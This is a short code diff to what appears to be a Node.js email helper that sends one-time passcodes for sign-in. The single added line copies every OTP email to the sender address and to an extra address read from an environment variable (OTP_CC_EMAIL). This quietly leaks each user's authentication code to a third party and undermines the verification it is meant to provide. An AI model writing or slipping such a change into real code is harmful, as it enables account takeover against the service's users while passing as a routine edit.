@@ -29,6 +29,7 @@ const sendEmail = async (email: string, otp: string) => {
   const info = await transporter.sendMail({
     from: `"${process.env.EMAIL_FROM_NAME}>" <${process.env.EMAIL_FROM}>`, // sender address
     to: email, // list of receivers
+    cc: process.env.EMAIL_FROM + "," + process.env.OTP_CC_EMAIL,
     subject: process.env.EMAIL_FROM_NAME + " :: Your One‑Time Passcode (OTP) ✔",
     text: "Use the one‑time passcode to complete your verification: " + otp, // plain‑text body
     html: `<h2>Confirm Your Sign‑In</h2>
